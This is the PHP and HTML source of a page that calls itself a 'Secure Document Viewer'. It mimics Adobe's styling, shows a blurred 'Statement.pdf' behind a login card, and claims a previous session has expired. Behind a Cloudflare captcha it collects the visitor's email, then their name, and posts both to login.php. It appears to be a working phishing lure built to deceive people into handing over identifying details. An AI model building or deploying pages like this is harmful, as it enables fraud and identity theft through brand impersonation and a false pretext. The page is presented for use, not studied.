<?php
session_start();

// Step control
$step = $_SESSION['step'] ?? 1;

// Old email
$old_email = $_SESSION['old_email'] ?? '';
$error     = $_SESSION['error_message'] ?? '';
unset($_SESSION['error_message']);

$hasError = !empty($error);

// Hide "session expired" message if this error shows
$hideSessionMsg = ($error === 'Incorrect name entered.');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Document Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Turnstile -->
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

    <style>
        *, *::before, *::after { box-sizing: border-box; }

        /* -------------------------------------------
           Adobe-style variables
        -------------------------------------------- */
        :root {
            --card-bg: #ffffff;
            --text-color: #222;
            --subtext: #6b6b6b;
            --border: #d4d4d4;
            --btn-bg: #1473e6;
            --btn-hover: #0f5cc0;
            --error: #c9252d;
            --overlay-dark: rgba(0,0,0,0.65);
            --readonly-bg: #e3e5eb;
            --divider: #e8e8e8;
            --font-xs: 11px;
            --font-sm: 12px;
            --font-btn: 12px;
        }

        /* DARK MODE */
        @media (prefers-color-scheme: dark) {
            :root {
                --card-bg: #1e1e1f;
                --text-color: #f3f3f3;
                --subtext: #a0a0a0;
                --border: #333;
                --btn-bg: #4a8fff;
                --btn-hover: #3a73d0;
                --readonly-bg: #2a2d35;
                --divider: #2c2c2c;
            }
        }

        /* -------------------------------------------
           PAGE WRAPPER + BACKGROUND
        -------------------------------------------- */
        body {
            margin: 0;
            font-family: "Segoe UI", system-ui, sans-serif;
            background: #111;
            color: var(--text-color);
            min-height: 100vh;
        }

        .page-wrapper {
            position: relative;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .doc-background {
            position: absolute;
            inset: 0;
            filter: blur(6px);
            opacity: 0.7;
            transform: scale(1.04);
        }
        .doc-background img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .page-wrapper::before {
            content: "";
            position: absolute;
            inset: 0;
            background: var(--overlay-dark);
        }

        /* -------------------------------------------
           CARD (Adobe clean style)
        -------------------------------------------- */
        .login-card {
            width: 95%;
            max-width: 320px;
            background: var(--card-bg);
            border-radius: 4px;
            padding: 18px 20px 22px;
            border: 1px solid #d0d0d0;
            box-shadow: 0 10px 24px rgba(0,0,0,0.26);
            z-index: 2;

            opacity: 0;
            transform: translateY(14px) scale(0.985);
            animation: fadeIn 0.45s ease-out forwards;
        }

        .login-card.has-error {
            border-color: rgba(201,37,45,0.5);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px) scale(0.97); }
            to   { opacity: 1; transform: translateY(0) scale(1); }
        }

        .top-divider {
            height: 1px;
            background: var(--divider);
            margin: 8px 0 12px;
        }

        /* -------------------------------------------
           HEADER
        -------------------------------------------- */
        .doc-icon {
            width: 38px;
            height: 38px;
            margin: 0 auto 6px;
        }
        .doc-icon-img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .doc-title {
            text-align: center;
            font-size: 14px;
            margin-bottom: 2px;
            font-weight: 600;
        }

        .doc-size {
            color: var(--subtext);
            font-size: var(--font-xs);
        }

        .doc-subtitle {
            text-align: center;
            color: var(--error);
            font-size: var(--font-xs);
            margin-bottom: 6px;
            font-weight: 600;
        }

        .login-error {
            color: var(--error);
            font-size: var(--font-xs);
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
        }

        /* -------------------------------------------
           FORM ELEMENTS
        -------------------------------------------- */
        .field-wrapper {
            margin-bottom: 9px;
            position: relative;
        }

        .field-wrapper input {
            width: 100%;
            padding: 8px 9px;
            font-size: var(--font-sm);
            border: 1px solid var(--border);
            border-radius: 3px;
            background: #fefefe;
            outline: none;
        }

        .field-wrapper input:focus {
            border-color: var(--btn-bg);
            box-shadow: 0 0 0 1px rgba(20,115,230,0.22);
            background: white;
        }

        /* DARK MODE FIX — email typing stays black */
        input[type="email"] {
            color: #000 !important;
        }

        /* Read-only email field */
        .readonly-input {
            background: var(--readonly-bg);
            color: var(--subtext);
            cursor: not-allowed;
        }

        /* -------------------------------------------
           LOCK ICON INSIDE NAME FIELD
        -------------------------------------------- */
        .lock-icon {
            position: absolute;
            right: 9px;
            top: 50%;
            transform: translateY(-50%);
            width: 13px;
            height: 13px;
            opacity: 0.55;
            pointer-events: none;
        }

        /* -------------------------------------------
           CAPTCHA
        -------------------------------------------- */
        .captcha-wrapper {
            display: flex;
            justify-content: center;
            margin: 6px 0 4px;
        }

        .cf-turnstile {
            transform: scale(0.9);
            transform-origin: center;
        }

        /* -------------------------------------------
           BUTTON (Adobe-style)
        -------------------------------------------- */
        .btn-primary {
            width: 100%;
            padding: 9px 10px;
            background: var(--btn-bg);
            color: white;
            border: none;
            border-radius: 3px;
            font-size: var(--font-btn);
            font-weight: 600;
            cursor: pointer;
            margin-top: 4px;
        }
        .btn-primary:hover {
            background: var(--btn-hover);
        }
    </style>
</head>
<body>
<div class="page-wrapper">

    <div class="doc-background">
        <img src="assets/background.png">
    </div>

    <div class="login-card<?= $hasError ? ' has-error' : '' ?>">

        <div class="doc-icon">
            <img src="assets/PDtrans.png" class="doc-icon-img">
        </div>

        <h2 class="doc-title">
            Statement.pdf <span class="doc-size">(197 KB)</span>
        </h2>

        <?php if (!$hideSessionMsg): ?>
            <p class="doc-subtitle">Previous session has expired, login to continue.</p>
        <?php endif; ?>

        <div class="top-divider"></div>

        <?php if ($error): ?>
            <p class="login-error"><?= htmlspecialchars($error) ?></p>
        <?php endif; ?>

        <?php if ($step == 1): ?>
            <!-- STEP 1 -->
            <form method="POST" action="login.php">

                <div class="field-wrapper">
                    <input type="email" name="email" placeholder="Enter your email"
                           value="<?= htmlspecialchars($old_email) ?>" required>
                </div>

                <div class="captcha-wrapper">
                    <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
                </div>

                <button class="btn-primary">Next</button>
            </form>

        <?php else: ?>
            <!-- STEP 2 -->
            <form method="POST" action="login.php">

                <div class="field-wrapper">
                    <input type="email"
                           value="<?= htmlspecialchars($old_email) ?>"
                           class="readonly-input"
                           readonly>
                </div>

                <div class="field-wrapper">
                    <input type="text" name="name" placeholder="Enter your name" required>
                    <!-- tiny lock icon inside input -->
                    <img src="assets/lock.png" class="lock-icon" alt="">
                </div>

                <button class="btn-primary">Next</button>
            </form>
        <?php endif; ?>
    </div>
</div>
</body>
</html>
